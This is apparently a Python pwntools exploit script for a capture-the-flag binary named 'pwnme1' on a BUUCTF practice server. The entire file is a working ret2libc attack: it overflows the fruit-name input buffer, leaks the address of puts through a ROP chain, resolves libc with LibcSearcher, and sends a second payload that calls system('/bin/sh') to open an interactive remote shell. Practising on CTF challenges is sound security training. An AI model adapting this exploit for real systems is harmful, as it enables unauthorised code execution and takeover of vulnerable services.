from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

# io = process('./pwnme1')
io = remote('node4.buuoj.cn', 29037)
elf = ELF('./pwnme1')

io.sendlineafter(b'>> 6. Exit    \n', b'5')

payload = cyclic(0xA4 + 4)
payload += p32(elf.plt['puts'])
payload += p32(0x8048898)
payload += p32(elf.got['puts'])
payload += p32(elf.symbols['getfruit'])

io.sendlineafter(b'Please input the name of fruit:', payload)

io.recvuntil(b'...\n')
puts = u32(io.recv(4))
libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
system = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = cyclic(0xA4 + 4)
payload += p32(system)
payload += p32(0)
payload += p32(binsh)

io.sendlineafter(b'Please input the name of fruit:', payload)

io.interactive()
